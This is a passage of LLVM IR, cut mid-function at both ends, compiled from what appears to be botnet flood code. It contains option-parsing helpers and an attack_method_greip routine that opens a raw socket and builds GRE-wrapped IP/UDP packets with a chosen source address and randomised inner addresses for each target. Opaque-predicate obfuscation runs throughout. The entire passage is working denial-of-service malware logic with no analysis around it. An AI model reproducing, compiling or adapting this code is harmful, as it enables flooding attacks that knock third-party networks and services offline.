  %57 = load i8*, i8** %56, align 8
  store i8* %57, i8** %5, align 8
  %58 = load i32, i32* @x.13
  %59 = load i32, i32* @y.14
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %88

; <label>:66:                                     ; preds = %originalBBpart2
  br label %67

; <label>:67:                                     ; preds = %66
  %68 = load i32, i32* @x.13
  %69 = load i32, i32* @y.14
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %67
  %76 = load i32, i32* %10, align 4
  %77 = add nsw i32 %76, 1
  store i32 %77, i32* %10, align 4
  %78 = load i32, i32* @x.13
  %79 = load i32, i32* @y.14
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBBpart29, label %originalBB6alteredBB

originalBBpart29:                                 ; preds = %originalBB6
  br label %11

; <label>:86:                                     ; preds = %11
  %87 = load i8*, i8** %9, align 8
  store i8* %87, i8** %5, align 8
  br label %88

; <label>:88:                                     ; preds = %86, %originalBBpart24
  %89 = load i32, i32* @x.13
  %90 = load i32, i32* @y.14
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBB11, label %originalBB11alteredBB

originalBB11:                                     ; preds = %originalBB11alteredBB, %88
  %97 = load i8*, i8** %5, align 8
  %98 = load i32, i32* @x.13
  %99 = load i32, i32* @y.14
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBBpart213, label %originalBB11alteredBB

originalBBpart213:                                ; preds = %originalBB11
  ret i8* %97

originalBBalteredBB:                              ; preds = %originalBB, %16
  %106 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %107 = load i32, i32* %10, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %106, i64 %108
  %110 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %109, i32 0, i32 1
  %111 = load i8, i8* %110, align 8
  %112 = zext i8 %111 to i32
  %113 = load i8, i8* %8, align 1
  %114 = zext i8 %113 to i32
  %115 = icmp eq i32 %112, %114
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %43
  %116 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %117 = load i32, i32* %10, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %116, i64 %118
  %120 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %119, i32 0, i32 0
  %121 = load i8*, i8** %120, align 8
  store i8* %121, i8** %5, align 8
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %67
  %122 = load i32, i32* %10, align 4
  %_ = shl i32 %122, 1
  %_7 = sub i32 0, %122
  %gen = add i32 %_7, 1
  %123 = add nsw i32 %122, 1
  store i32 %123, i32* %10, align 4
  br label %originalBB6

originalBB11alteredBB:                            ; preds = %originalBB11, %88
  %124 = load i8*, i8** %5, align 8
  br label %originalBB11
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @util_atoi(i8* %20, i32 10)
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

declare i32 @util_atoi(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @inet_addr(i8* %20) #6
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_greip(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = load i32, i32* @x.19
  %6 = load i32, i32* @y.20
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i8, align 1
  %14 = alloca %struct.attack_target*, align 8
  %15 = alloca i8, align 1
  %16 = alloca %struct.attack_option*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8**, align 8
  %20 = alloca i8, align 1
  %21 = alloca i16, align 2
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i16, align 2
  %25 = alloca i16, align 2
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i8, align 1
  %29 = alloca i32, align 4
  %30 = alloca %struct.iphdr*, align 8
  %31 = alloca %struct.grehdr*, align 8
  %32 = alloca %struct.iphdr*, align 8
  %33 = alloca %struct.udphdr*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca %struct.iphdr*, align 8
  %36 = alloca %struct.grehdr*, align 8
  %37 = alloca %struct.iphdr*, align 8
  %38 = alloca %struct.udphdr*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %13, align 1
  store %struct.attack_target* %1, %struct.attack_target** %14, align 8
  store i8 %2, i8* %15, align 1
  store %struct.attack_option* %3, %struct.attack_option** %16, align 8
  %41 = load i8, i8* %13, align 1
  %42 = zext i8 %41 to i64
  %43 = call noalias i8* @calloc(i64 %42, i64 8) #6
  %44 = bitcast i8* %43 to i8**
  store i8** %44, i8*** %19, align 8
  %45 = load i8, i8* %15, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 2, i32 0)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %20, align 1
  %49 = load i8, i8* %15, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 3, i32 65535)
  %52 = trunc i32 %51 to i16
  store i16 %52, i16* %21, align 2
  %53 = load i8, i8* %15, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 4, i32 64)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %22, align 1
  %57 = load i8, i8* %15, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 5, i32 1)
  %60 = trunc i32 %59 to i8
  store i8 %60, i8* %23, align 1
  %61 = load i8, i8* %15, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 6, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %24, align 2
  %65 = load i8, i8* %15, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 7, i32 65535)
  %68 = trunc i32 %67 to i16
  store i16 %68, i16* %25, align 2
  %69 = load i8, i8* %15, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 0, i32 512)
  store i32 %71, i32* %26, align 4
  %72 = load i8, i8* %15, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 1, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %27, align 1
  %76 = load i8, i8* %15, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 19, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %28, align 1
  %80 = load i8, i8* %15, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %82 = load i32, i32* @LOCAL_ADDR, align 4
  %83 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 25, i32 %82)
  store i32 %83, i32* %29, align 4
  %84 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %84, i32* %18, align 4
  %85 = icmp eq i32 %84, -1
  %86 = load i32, i32* @x.19
  %87 = load i32, i32* @y.20
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %85, label %94, label %111

; <label>:94:                                     ; preds = %originalBBpart2
  %95 = load i32, i32* @x.19
  %96 = load i32, i32* @y.20
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %94
  %103 = load i32, i32* @x.19
  %104 = load i32, i32* @y.20
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %657

; <label>:111:                                    ; preds = %originalBBpart2
  store i32 1, i32* %17, align 4
  %112 = load i32, i32* %18, align 4
  %113 = bitcast i32* %17 to i8*
  %114 = call i32 @setsockopt(i32 %112, i32 0, i32 3, i8* %113, i32 4) #6
  %115 = icmp eq i32 %114, -1
  br i1 %115, label %116, label %119

; <label>:116:                                    ; preds = %111
  %117 = load i32, i32* %18, align 4
  %118 = call i32 @close(i32 %117)
  br label %657

; <label>:119:                                    ; preds = %111
  store i32 0, i32* %17, align 4
  br label %120

; <label>:120:                                    ; preds = %318, %119
  %121 = load i32, i32* @x.19
  %122 = load i32, i32* @y.20
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %120
  %129 = load i32, i32* %17, align 4
  %130 = load i8, i8* %13, align 1
  %131 = zext i8 %130 to i32
  %132 = icmp slt i32 %129, %131
  %133 = load i32, i32* @x.19
  %134 = load i32, i32* @y.20
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %132, label %141, label %321

; <label>:141:                                    ; preds = %originalBBpart28
  %142 = load i32, i32* @x.19
  %143 = load i32, i32* @y.20
  %144 = sub i32 %142, 1
  %145 = mul i32 %142, %144
  %146 = urem i32 %145, 2
  %147 = icmp eq i32 %146, 0
  %148 = icmp slt i32 %143, 10
  %149 = or i1 %147, %148
  br i1 %149, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %141
  %150 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %151 = load i8**, i8*** %19, align 8
  %152 = load i32, i32* %17, align 4
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds i8*, i8** %151, i64 %153
  store i8* %150, i8** %154, align 8
  %155 = load i8**, i8*** %19, align 8
  %156 = load i32, i32* %17, align 4
  %157 = sext i32 %156 to i64
  %158 = getelementptr inbounds i8*, i8** %155, i64 %157
  %159 = load i8*, i8** %158, align 8
  %160 = bitcast i8* %159 to %struct.iphdr*
  store %struct.iphdr* %160, %struct.iphdr** %30, align 8
  %161 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i64 1
  %163 = bitcast %struct.iphdr* %162 to %struct.grehdr*
  store %struct.grehdr* %163, %struct.grehdr** %31, align 8
  %164 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %165 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %164, i64 1
  %166 = bitcast %struct.grehdr* %165 to %struct.iphdr*
  store %struct.iphdr* %166, %struct.iphdr** %32, align 8
  %167 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %168 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %167, i64 1
  %169 = bitcast %struct.iphdr* %168 to %struct.udphdr*
  store %struct.udphdr* %169, %struct.udphdr** %33, align 8
  %170 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %171 = bitcast %struct.iphdr* %170 to i8*
  %172 = load i8, i8* %171, align 4
  %173 = and i8 %172, 15
  %174 = or i8 %173, 64
  store i8 %174, i8* %171, align 4
  %175 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %176 = bitcast %struct.iphdr* %175 to i8*
  %177 = load i8, i8* %176, align 4
  %178 = and i8 %177, -16
  %179 = or i8 %178, 5
  store i8 %179, i8* %176, align 4
  %180 = load i8, i8* %20, align 1
  %181 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %182 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %181, i32 0, i32 1
  store i8 %180, i8* %182, align 1
  %183 = load i32, i32* %26, align 4
  %184 = sext i32 %183 to i64
  %185 = add i64 52, %184
  %186 = trunc i64 %185 to i16
  %187 = call zeroext i16 @htons(i16 zeroext %186) #7
  %188 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %189 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %188, i32 0, i32 2
  store i16 %187, i16* %189, align 2
  %190 = load i16, i16* %21, align 2
  %191 = call zeroext i16 @htons(i16 zeroext %190) #7
  %192 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %193 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %192, i32 0, i32 3
  store i16 %191, i16* %193, align 4
  %194 = load i8, i8* %22, align 1
  %195 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %196 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %195, i32 0, i32 5
  store i8 %194, i8* %196, align 4
  %197 = load i8, i8* %23, align 1
  %198 = icmp ne i8 %197, 0
  %199 = load i32, i32* @x.19
  %200 = load i32, i32* @y.20
  %201 = sub i32 %199, 1
  %202 = mul i32 %199, %201
  %203 = urem i32 %202, 2
  %204 = icmp eq i32 %203, 0
  %205 = icmp slt i32 %200, 10
  %206 = or i1 %204, %205
  br i1 %206, label %originalBBpart245, label %originalBB10alteredBB

originalBBpart245:                                ; preds = %originalBB10
  br i1 %198, label %207, label %211

; <label>:207:                                    ; preds = %originalBBpart245
  %208 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %209 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %210 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %209, i32 0, i32 4
  store i16 %208, i16* %210, align 2
  br label %211

; <label>:211:                                    ; preds = %207, %originalBBpart245
  %212 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %213 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %212, i32 0, i32 6
  store i8 47, i8* %213, align 1
  %214 = load i32, i32* %29, align 4
  %215 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %216 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %215, i32 0, i32 8
  store i32 %214, i32* %216, align 4
  %217 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %218 = load i32, i32* %17, align 4
  %219 = sext i32 %218 to i64
  %220 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %217, i64 %219
  %221 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %220, i32 0, i32 1
  %222 = load i32, i32* %221, align 4
  %223 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %224 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %223, i32 0, i32 9
  store i32 %222, i32* %224, align 4
  %225 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %226 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %227 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %226, i32 0, i32 1
  store i16 %225, i16* %227, align 2
  %228 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %229 = bitcast %struct.iphdr* %228 to i8*
  %230 = load i8, i8* %229, align 4
  %231 = and i8 %230, 15
  %232 = or i8 %231, 64
  store i8 %232, i8* %229, align 4
  %233 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %234 = bitcast %struct.iphdr* %233 to i8*
  %235 = load i8, i8* %234, align 4
  %236 = and i8 %235, -16
  %237 = or i8 %236, 5
  store i8 %237, i8* %234, align 4
  %238 = load i8, i8* %20, align 1
  %239 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %240 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %239, i32 0, i32 1
  store i8 %238, i8* %240, align 1
  %241 = load i32, i32* %26, align 4
  %242 = sext i32 %241 to i64
  %243 = add i64 28, %242
  %244 = trunc i64 %243 to i16
  %245 = call zeroext i16 @htons(i16 zeroext %244) #7
  %246 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %247 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %246, i32 0, i32 2
  store i16 %245, i16* %247, align 2
  %248 = load i16, i16* %21, align 2
  %249 = zext i16 %248 to i32
  %250 = xor i32 %249, -1
  %251 = trunc i32 %250 to i16
  %252 = call zeroext i16 @htons(i16 zeroext %251) #7
  %253 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %254 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %253, i32 0, i32 3
  store i16 %252, i16* %254, align 4
  %255 = load i8, i8* %22, align 1
  %256 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %257 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %256, i32 0, i32 5
  store i8 %255, i8* %257, align 4
  %258 = load i8, i8* %23, align 1
  %259 = icmp ne i8 %258, 0
  br i1 %259, label %260, label %280

; <label>:260:                                    ; preds = %211
  %261 = load i32, i32* @x.19
  %262 = load i32, i32* @y.20
  %263 = sub i32 %261, 1
  %264 = mul i32 %261, %263
  %265 = urem i32 %264, 2
  %266 = icmp eq i32 %265, 0
  %267 = icmp slt i32 %262, 10
  %268 = or i1 %266, %267
  br i1 %268, label %originalBB47, label %originalBB47alteredBB

originalBB47:                                     ; preds = %originalBB47alteredBB, %260
  %269 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %270 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %271 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %270, i32 0, i32 4
  store i16 %269, i16* %271, align 2
  %272 = load i32, i32* @x.19
  %273 = load i32, i32* @y.20
  %274 = sub i32 %272, 1
  %275 = mul i32 %272, %274
  %276 = urem i32 %275, 2
  %277 = icmp eq i32 %276, 0
  %278 = icmp slt i32 %273, 10
  %279 = or i1 %277, %278
  br i1 %279, label %originalBBpart249, label %originalBB47alteredBB

originalBBpart249:                                ; preds = %originalBB47
  br label %280

; <label>:280:                                    ; preds = %originalBBpart249, %211
  %281 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %282 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %281, i32 0, i32 6
  store i8 17, i8* %282, align 1
  %283 = call i32 @rand_next()
  %284 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %285 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %284, i32 0, i32 8
  store i32 %283, i32* %285, align 4
  %286 = load i8, i8* %28, align 1
  %287 = icmp ne i8 %286, 0
  br i1 %287, label %288, label %294

; <label>:288:                                    ; preds = %280
  %289 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %290 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %289, i32 0, i32 9
  %291 = load i32, i32* %290, align 4
  %292 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %293 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %292, i32 0, i32 9
  store i32 %291, i32* %293, align 4
  br label %302

; <label>:294:                                    ; preds = %280
  %295 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %296 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %295, i32 0, i32 8
  %297 = load i32, i32* %296, align 4
  %298 = sub i32 %297, 1024
  %299 = xor i32 %298, -1
  %300 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %301 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %300, i32 0, i32 9
  store i32 %299, i32* %301, align 4
  br label %302

; <label>:302:                                    ; preds = %294, %288
  %303 = load i16, i16* %24, align 2
  %304 = call zeroext i16 @htons(i16 zeroext %303) #7
  %305 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %306 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %305, i32 0, i32 0
  store i16 %304, i16* %306, align 2
  %307 = load i16, i16* %25, align 2
  %308 = call zeroext i16 @htons(i16 zeroext %307) #7
  %309 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %310 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %309, i32 0, i32 1
  store i16 %308, i16* %310, align 2
  %311 = load i32, i32* %26, align 4
  %312 = sext i32 %311 to i64
  %313 = add i64 8, %312
  %314 = trunc i64 %313 to i16
  %315 = call zeroext i16 @htons(i16 zeroext %314) #7
  %316 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %317 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %316, i32 0, i32 2
  store i16 %315, i16* %317, align 2
  br label %318

; <label>:318:                                    ; preds = %302
  %319 = load i32, i32* %17, align 4
  %320 = add nsw i32 %319, 1
  store i32 %320, i32* %17, align 4
  br label %120

; <label>:321:                                    ; preds = %originalBBpart28
  br label %322

; <label>:322:                                    ; preds = %656, %321
  store i32 0, i32* %17, align 4
  br label %323

; <label>:323:                                    ; preds = %originalBBpart2132, %322
  %324 = load i32, i32* @x.19
  %325 = load i32, i32* @y.20
  %326 = sub i32 %324, 1
  %327 = mul i32 %324, %326
  %328 = urem i32 %327, 2
  %329 = icmp eq i32 %328, 0
  %330 = icmp slt i32 %325, 10
  %331 = or i1 %329, %330
  br i1 %331, label %originalBB51, label %originalBB51alteredBB

originalBB51:                                     ; preds = %originalBB51alteredBB, %323
  %332 = load i32, i32* %17, align 4
  %333 = load i8, i8* %13, align 1
  %334 = zext i8 %333 to i32
  %335 = icmp slt i32 %332, %334
  %336 = load i32, i32* @x.19
  %337 = load i32, i32* @y.20
  %338 = sub i32 %336, 1
  %339 = mul i32 %336, %338
  %340 = urem i32 %339, 2
  %341 = icmp eq i32 %340, 0
  %342 = icmp slt i32 %337, 10
  %343 = or i1 %341, %342
  br i1 %343, label %originalBBpart253, label %originalBB51alteredBB

originalBBpart253:                                ; preds = %originalBB51
  br i1 %335, label %344, label %656

; <label>:344:                                    ; preds = %originalBBpart253
  %345 = load i8**, i8*** %19, align 8
  %346 = load i32, i32* %17, align 4
  %347 = sext i32 %346 to i64
  %348 = getelementptr inbounds i8*, i8** %345, i64 %347
  %349 = load i8*, i8** %348, align 8
  store i8* %349, i8** %34, align 8
  %350 = load i8*, i8** %34, align 8
  %351 = bitcast i8* %350 to %struct.iphdr*
  store %struct.iphdr* %351, %struct.iphdr** %35, align 8
  %352 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %353 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %352, i64 1
  %354 = bitcast %struct.iphdr* %353 to %struct.grehdr*
  store %struct.grehdr* %354, %struct.grehdr** %36, align 8
  %355 = load %struct.grehdr*, %struct.grehdr** %36, align 8
  %356 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %355, i64 1
  %357 = bitcast %struct.grehdr* %356 to %struct.iphdr*
  store %struct.iphdr* %357, %struct.iphdr** %37, align 8
  %358 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %359 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %358, i64 1
  %360 = bitcast %struct.iphdr* %359 to %struct.udphdr*
  store %struct.udphdr* %360, %struct.udphdr** %38, align 8
  %361 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %362 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %361, i64 1
  %363 = bitcast %struct.udphdr* %362 to i8*
  store i8* %363, i8** %39, align 8
  %364 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %365 = load i32, i32* %17, align 4
  %366 = sext i32 %365 to i64
  %367 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %364, i64 %366
  %368 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %367, i32 0, i32 2
  %369 = load i8, i8* %368, align 4
  %370 = zext i8 %369 to i32
  %371 = icmp slt i32 %370, 32
  br i1 %371, label %372, label %409

; <label>:372:                                    ; preds = %344
  %373 = load i32, i32* @x.19
  %374 = load i32, i32* @y.20
  %375 = sub i32 %373, 1
  %376 = mul i32 %373, %375
  %377 = urem i32 %376, 2
  %378 = icmp eq i32 %377, 0
  %379 = icmp slt i32 %374, 10
  %380 = or i1 %378, %379
  br i1 %380, label %originalBB55, label %originalBB55alteredBB

originalBB55:                                     ; preds = %originalBB55alteredBB, %372
  %381 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %382 = load i32, i32* %17, align 4
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %381, i64 %383
  %385 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %384, i32 0, i32 1
  %386 = load i32, i32* %385, align 4
  %387 = call i32 @ntohl(i32 %386) #7
  %388 = call i32 @rand_next()
  %389 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %390 = load i32, i32* %17, align 4
  %391 = sext i32 %390 to i64
  %392 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %389, i64 %391
  %393 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %392, i32 0, i32 2
  %394 = load i8, i8* %393, align 4
  %395 = zext i8 %394 to i32
  %396 = lshr i32 %388, %395
  %397 = add i32 %387, %396
  %398 = call i32 @htonl(i32 %397) #7
  %399 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %400 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %399, i32 0, i32 9
